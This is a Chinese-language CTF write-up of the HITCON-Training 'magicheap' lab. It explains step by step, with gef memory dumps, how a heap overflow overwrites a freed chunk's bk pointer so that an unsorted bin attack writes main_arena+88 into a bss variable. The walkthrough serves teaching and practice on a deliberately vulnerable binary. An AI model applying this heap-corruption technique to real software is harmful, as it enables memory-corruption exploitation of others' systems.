

# magicheap（unsorted_bin_attack)

题目链接：

<https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab14>



首先分析程序，存在任意长度堆溢出，我们的目的是覆盖 bss 段的 magic 变量，使其大于 0x1305, 很容易想到 unsorted bin attack， 该技术达到的效果就是写 unsorted_chunks (av) 到任意地址，而这个值是比较大的。

我会着重展示内存的变化：

bk 是指向 chunk 的 pre_size 的地方的，而我们的 target address 对应的是 fake chunk 的 fd 的地方。

所以  bk = target_address-0x10

我们直接利用堆溢出，将 unsorted bin 链表中的第一个 chunk 的bk，从而malloc 堆块的时候就能达到 bk 写 unsorted bin 链表头部值的效果。



1. 首先 malloc 三个 chunk，分别问 chunk 0, chunk1,chunk2:

```python
gef➤  heap chunks
Chunk(addr=0xa1e010, size=0x30, flags=PREV_INUSE)
    [0x0000000000a1e010     61 61 61 61 0a 00 00 00 00 00 00 00 00 00 00 00     aaaa............]
Chunk(addr=0xa1e040, size=0x90, flags=PREV_INUSE)
    [0x0000000000a1e040     78 5b db 87 c9 7f 00 00 78 5b db 87 c9 7f 00 00     x[......x[......]
Chunk(addr=0xa1e0d0, size=0x30, flags=)
    [0x0000000000a1e0d0     63 63 63 63 0a 00 00 00 00 00 00 00 00 00 00 00     cccc............]
Chunk(addr=0xa1e100, size=0x20f10, flags=PREV_INUSE)  ←  top chunk
```



chunk0 用来写，chunk1 用来free 后放入 unsorted bin 链表，所以大小要大于 fastbin 的最大值，chunk 2 防止 free 1 时

2. 接下来我们 free chunk 1, chunk 1 放入 unsorted bin 链表

```python
[+] unsorted_bins[0]: fw=0xa1e030, bk=0xa1e030
 →   Chunk(addr=0xa1e040, size=0x90, flags=PREV_INUSE)
```

此时 chunk 1 的内容：

```python
gef➤  x/16gx 0xa1e040-0x10
0xa1e030:	0x0000000000000000	0x0000000000000091
0xa1e040:	0x00007fc987db5b78	0x00007fc987db5b78
0xa1e050:	0x0000000000000000	0x0000000000000000
0xa1e060:	0x0000000000000000	0x0000000000000000
0xa1e070:	0x0000000000000000	0x0000000000000000
0xa1e080:	0x0000000000000000	0x0000000000000000
0xa1e090:	0x0000000000000000	0x0000000000000000
0xa1e0a0:	0x0000000000000000	0x0000000000000000

```



3. 接下来，利用堆溢出漏洞写chunk0, 覆盖 chunk1 中的 bk 指针。

此时chunk1的内容,已经成功修改 bk 指针

```
gef➤  x/16gx 0xa1e040-0x10
0xa1e030:	0x0000000000000000	0x0000000000000091
0xa1e040:	0x0000000000000000	0x00000000006020b0
0xa1e050:	0x0000000000000000	0x0000000000000000
0xa1e060:	0x0000000000000000	0x0000000000000000
```



此时 magic 的值：

```
gef➤  x/16gx 0x00000000006020b0
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007fc987db58e0	0x0000000000000000
0x6020c0 <magic>:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0 <heaparray>:	0x0000000000a1e010	0x0000000000000000
```

看，此时 unsorted bin 的 bk 值

```
unsorted_bins[0]: fw=0xa1e030, bk=0x6020b0
```



4. 接下来malloc,刚好重新分配 chunk1 给我们。从 unsorted bin 取出，然后bk 就会指向 unsorted bin 的头，从而修改 magic 的值，是不是很简单。

从、此时 magic 的值也被修改了：

```
gef➤  x/16gx 0x6020b0
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007fc987db58e0	0x0000000000000000
0x6020c0 <magic>:	0x00007fc987db5b78	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
```

这个值就是 unsorted bin 链表的头部，也就是 main_arena+88。

结束了~

题目相关内容可以

四步：

- malloc three chunks
- free chunk1
- overwrite bk of chunk1
- malloc a chunk, the size is same with chunk1

我们再来回顾一下这道题：

- 首先漏洞是edit函数的堆溢出
- 其次add delete edit 基本都没有太多限制，很方便我们执行 attack
- 最终目的是改写bss段的某个值。

由此想到每道题的最终目的都是不一样的。

其实边写边觉得.... 这些东西都写烂了吧，不过我要想总结出新的东西，还是需要耐着性子重新过一遍的。

